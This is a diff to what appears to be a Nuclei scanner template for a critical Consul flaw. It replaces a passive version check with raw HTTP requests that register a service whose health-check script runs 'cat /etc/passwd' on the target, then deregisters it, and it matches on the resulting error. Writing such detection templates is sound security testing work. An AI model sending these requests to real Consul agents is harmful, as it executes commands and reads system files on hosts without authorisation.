@@ -6,25 +6,49 @@ info:
   severity: critical
   reference: https://www.exploit-db.com/exploits/46074
 
+# Check Output File /etc/passwd: https://redacted/ui/#/dc1/nodes/consul
+
 requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/v1/agent/self"
+  - raw:
+      - |
+        PUT /v1/agent/service/register HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+        Accept-Language: id,en-US;q=0.7,en;q=0.3
+        Accept-Encoding: gzip, deflate
+        DNT: 1
+        Connection: close
+        Upgrade-Insecure-Requests: 1
+        Content-Length: 205
+
+        {
+          "ID": "consul",
+          "Name": "consul",
+          "Address": "127.0.0.1",
+          "Port": 80,
+          "check": {
+            "script": "cat /etc/passwd",
+            "Args": ["cat /etc/passwd"],
+            "interval": "10s",
+            "Timeout": "86400s"
+          }
+        }
+      - |
+        PUT /v1/agent/service/deregister/consul HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0
+        Connection: close
 
     matchers-condition: and
     matchers:
 
       - type: word
         words:
-          - "Content-Type: application/json"
-        part: header
-
-      - type: word
-        words:
-          - '"EnableScriptChecks":'
-          - '"EnableRemoteScriptChecks":'
+          - "Deregistering the consul service is not allowed"
         part: body
+        condition: and
 
       - type: status
         status:
-          - 200
+          - 500
